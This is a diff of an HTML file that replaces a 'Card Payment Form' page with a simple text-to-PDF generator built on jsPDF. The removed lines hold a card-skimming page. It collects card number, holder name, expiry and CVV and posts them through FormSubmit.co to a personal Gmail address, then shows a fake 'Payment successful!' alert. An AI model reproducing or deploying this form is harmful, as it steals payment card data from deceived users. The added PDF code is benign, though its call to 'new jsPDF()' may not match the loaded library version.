@@ -3,113 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Card Payment Form</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .card {
-            width: 300px;
-            background-color: #fff;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .card img {
-            width: 100%;
-            height: auto;
-            border-radius: 8px;
-            margin-bottom: 10px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-        }
-
-        input {
-            width: 100%;
-            padding: 8px;
-            margin-bottom: 16px;
-            box-sizing: border-box;
-        }
-
-        button {
-            background-color: #4caf50;
-            color: #fff;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #45a049;
-        }
-    </style>
+    <title>Text to PDF Generator</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.4.0/jspdf.umd.min.js"></script>
 </head>
 <body>
 
-<div class="card">
-    <img id="card-front" src="card_front_placeholder.png" alt="Card Front">
-    <label for="card-number">Card Number</label>
-    <input type="text" id="card-number" placeholder="1234 5678 9012 3456">
-
-    <label for="card-holder">Card Holder</label>
-    <input type="text" id="card-holder" placeholder="John Doe">
-
-    <label for="expiry-date">Expiry Date</label>
-    <input type="text" id="expiry-date" placeholder="MM/YY">
-
-    <label for="cvv">CVV</label>
-    <input type="text" id="cvv" placeholder="123">
-
-    <button onclick="submitForm()">Pay Now</button>
+<div>
+    <h1>Text to PDF Generator</h1>
+    <textarea id="inputText" rows="10" cols="50" placeholder="Enter your text here"></textarea>
+    <br>
+    <button onclick="generatePDF()">Generate PDF</button>
 </div>
 
 <script>
-    function submitForm() {
-        // Replace this with your actual FormSubmit.co URL
-        var formSubmitURL = "https://formsubmit.co/younusyounus3090@gmail.com";
+    function generatePDF() {
+        // Get the text from the textarea
+        var inputText = document.getElementById('inputText').value;
 
-        // Collect form data
-        var cardNumber = document.getElementById('card-number').value;
-        var cardHolder = document.getElementById('card-holder').value;
-        var expiryDate = document.getElementById('expiry-date').value;
-        var cvv = document.getElementById('cvv').value;
+        // Create a new jsPDF instance
+        var pdf = new jsPDF();
 
-        // Create a FormData object to send data
-        var formData = new FormData();
-        formData.append('card-number', cardNumber);
-        formData.append('card-holder', cardHolder);
-        formData.append('expiry-date', expiryDate);
-        formData.append('cvv', cvv);
+        // Add text to the PDF
+        pdf.text(inputText, 20, 20);
 
-        // Send the form data to FormSubmit.co using Fetch API
-        fetch(formSubmitURL, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log(data); // Handle the response from FormSubmit.co
-            alert('Payment successful!'); // Replace with your success handling code
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('Payment failed. Please try again.'); // Replace with your error handling code
-        });
+        // Save the PDF with a filename
+        pdf.save('generated.pdf');
     }
 </script>
 
 </body>
-	    </html>
-
+</html>
